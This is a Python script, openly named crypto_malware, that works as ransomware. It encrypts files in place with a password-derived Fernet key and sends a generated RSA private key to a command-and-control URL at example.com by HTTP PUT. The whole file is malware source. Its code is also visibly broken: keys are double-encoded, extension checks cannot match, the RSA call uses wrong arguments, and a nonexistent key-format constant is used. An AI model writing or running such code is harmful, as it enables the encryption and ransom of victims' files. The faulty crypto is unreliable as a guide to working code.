import os
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
import hashlib
import uuid
import requests

def generate_key(password):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=b'salt',
        iterations=100000,
        backend=default_backend()
    )
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

def generate_rsa_key():
    private_key = rsa.generate_private_key(
      public_exponent=65537,
      key_size=2048,
      backend=default_backend()
    )
    public_key = private_key.public_key()
    encoded_public_key = public_key.public_bytes(
      encoding=serialization.Encoding.OpenSSH,
      format=serialization.PublicFormat.OpenSSH
    )
    return private_key, public_key

def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted_data = f.encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def decrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

def send_key(c2_server, private_key):
    encoded_private_key = private_key.private_bytes(
      encoding=serialization.Encoding.PEM,
      format=serialization.PrivateFormat.TraditionalOpenSSHPem,
      encryption_algorithm=serialization.NoEncryption()
    )
    headers = {
        "Content-Type": "application/x-pem-buffer"
    }
    response = requests.put(c2_server, data=encoded_private_key, headers=headers)
    if response.status_code == 201:
        print("Key sent successfully")
    else:
        print("Failed to send key")

def crypto_malware(file_paths, password):
    private_key, public_key = generate_rsa_key()
    c2_server = "http://example.com/key"

    for file_path in file_paths:
        key = generate_key(password)
        fernet_key = base64.urlsafe_b64encode(key)

        encrypt_file(file_path, fernet_key)

        # Get file extension
        file_ext = os.path.splitext(file_path)[1][1:].lower()

        if file_ext in ['.docx', '.jpg']:
            print(f"Encrypted {file_path}")
            key_encrypted_with_public_key = public_key.encrypt(
              key,
              hashes.SHA256()
            )
            with open("key.pem", "wb") as f:
                f.write(key_encrypted_with_public_key)
            send_key(c2_server, private_key)

if __name__ == "__main__":
    password = input("Enter password: ")
    file_paths = [input("Enter file path (comma separated): ").split(',')]
    crypto_malware(file_paths, password)
